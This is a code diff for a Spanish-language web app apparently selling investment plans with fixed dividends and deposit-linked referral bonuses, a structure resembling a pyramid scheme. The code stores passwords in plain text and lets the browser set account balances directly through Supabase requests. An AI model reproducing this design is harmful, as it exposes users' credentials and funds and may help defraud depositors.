@@ -105,7 +105,7 @@
     </div>
   </div>
 
-  <!-- PANTALLA DE ACCESO (REGISTRO / LOGIN DINÁMICO) -->
+  <!-- PANTALLA DE ACCESO -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
@@ -243,12 +243,12 @@
           <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5 text-main">
             <i class="fa-solid fa-box-open text-sky-600"></i> Tus Acciones Adquiridas
           </h2>
-          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">El capital y los dividendos se acreditan al culminar el reloj en vivo.</p>
+          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">El capital y los dividendos se acreditan automáticamente al culminar el ciclo.</p>
         </div>
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
-      <!-- VISTA 3: COMPARTIR (CON LISTA DE INVITADOS EN TIEMPO REAL) -->
+      <!-- VISTA 3: COMPARTIR -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
@@ -280,7 +280,7 @@
           <p>Un usuario se registra como Oficial tras concretar su primer depósito ($2.000 ARS). Las bonificaciones se liberan de forma automática.</p>
         </div>
 
-        <!-- LISTA DINÁMICA DE INVITADOS REGISTRADOS -->
+        <!-- LISTA DINÁMICA DE INVITADOS -->
         <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
           <div class="flex justify-between items-center">
             <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Tus Invitados Registrados</h3>
@@ -577,10 +577,14 @@
       if (body) options.body = JSON.stringify(body);
       try {
         const res = await fetch(`${SUPABASE_API_URL}/${endpoint}`, options);
-        if (!res.ok) return null;
+        if (!res.ok) {
+          const errBody = await res.text();
+          console.warn(`Supabase Error (${res.status}):`, errBody);
+          return null;
+        }
         return await res.json();
       } catch (e) {
-        console.warn("Supabase warning:", e);
+        console.warn("Supabase Network Warning:", e);
         return null;
       }
     }
@@ -688,6 +692,7 @@
         localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
       } catch(e) {}
       renderUI();
+      renderProducts();
     }
 
     function fmt(n) {
@@ -733,7 +738,6 @@
       cargarInvitadosEnVivo();
     }
 
-    // CONSULTA EN TIEMPO REAL A SUPABASE DE LOS INVITADOS DEL USUARIO
     async function cargarInvitadosEnVivo() {
       const container = document.getElementById('invites-list-container');
       const badge = document.getElementById('invites-count-badge');
@@ -744,7 +748,6 @@
 
       let invitados = [];
       try {
-        // Consultar quiénes fueron invitados por este usuario
         const data1 = await supabaseRequest(`usuarios?invited_by=eq.${encodeURIComponent(rawPhone)}&select=phone,name,balance,created_at`);
         if (Array.isArray(data1)) invitados = invitados.concat(data1);
 
@@ -785,6 +788,7 @@
       }).join('');
     }
 
+    // SINCRONIZACIÓN DE SALDO Y PLANES ACTIVOS DESDE SUPABASE
     async function sincronizarSaldoServidor() {
       if (!appState.phone) return;
       
@@ -804,6 +808,12 @@
         if (data[0].name) appState.name = data[0].name;
         if (data[0].cvu) appState.cvu = data[0].cvu;
         if (data[0].alias) appState.alias = data[0].alias;
+        
+        // Sincronizar planes activos desde Supabase
+        if (data[0].active_plans && Array.isArray(data[0].active_plans)) {
+          appState.activePlans = data[0].active_plans;
+        }
+
         saveLocal();
       }
     }
@@ -816,6 +826,7 @@
         updateReferralLink();
         await sincronizarSaldoServidor();
         renderUI();
+        renderProducts();
         document.getElementById('notice-modal').classList.remove('hidden');
       } else {
         generateCaptcha();
@@ -865,7 +876,6 @@
           return;
         }
 
-        // REGISTRO OBLIGATORIO CON AWAIT
         await supabaseRequest('usuarios', 'POST', {
           phone: phone,
           pass: pass,
@@ -873,7 +883,8 @@
           cvu: '',
           alias: '',
           balance: 0,
-          invited_by: referredBy
+          invited_by: referredBy,
+          active_plans: []
         });
       } else {
         const dbUsers = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=*`);
@@ -888,6 +899,9 @@
           appState.name = dbUsers[0].name || '';
           appState.cvu = dbUsers[0].cvu || '';
           appState.alias = dbUsers[0].alias || '';
+          if (dbUsers[0].active_plans && Array.isArray(dbUsers[0].active_plans)) {
+            appState.activePlans = dbUsers[0].active_plans;
+          }
         }
       }
 
@@ -901,6 +915,7 @@
       updateReferralLink();
       await sincronizarSaldoServidor();
       renderUI();
+      renderProducts();
 
       document.getElementById('notice-modal').classList.remove('hidden');
     };
@@ -923,6 +938,7 @@
       document.getElementById(`nav-btn-${tabName}`).className = "bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition";
       
       if (tabName === 'compartir') updateReferralLink();
+      if (tabName === 'productos') renderProducts();
       await sincronizarSaldoServidor();
     };
 
@@ -991,6 +1007,7 @@
       });
     }
 
+    // ACTIVACIÓN CON GUARDADO DIRECTO EN SUPABASE
     window.handlePlanClick = async function(planId) {
       const p = plans.find(item => item.id === planId);
       if (!p) return;
@@ -1014,7 +1031,13 @@
           });
 
           saveLocal();
-          await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { balance: appState.balance });
+
+          // Guardar saldo y contrato en Supabase para que no se pierdan nunca
+          await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
+            balance: appState.balance,
+            active_plans: appState.activePlans
+          });
+
           alert(`¡Plan activado con éxito! Monitorea el conteo en "Productos".`);
           switchTab('productos');
         }
@@ -1049,7 +1072,10 @@
           appState.balance += plan.total;
           appState.activePlans.splice(index, 1);
           saveLocal();
-          supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { balance: appState.balance });
+          supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
+            balance: appState.balance,
+            active_plans: appState.activePlans
+          });
           alert(`¡Ciclo culminado! Se acreditaron $${fmt(plan.total)} ARS a tu balance.`);
           return;
         }
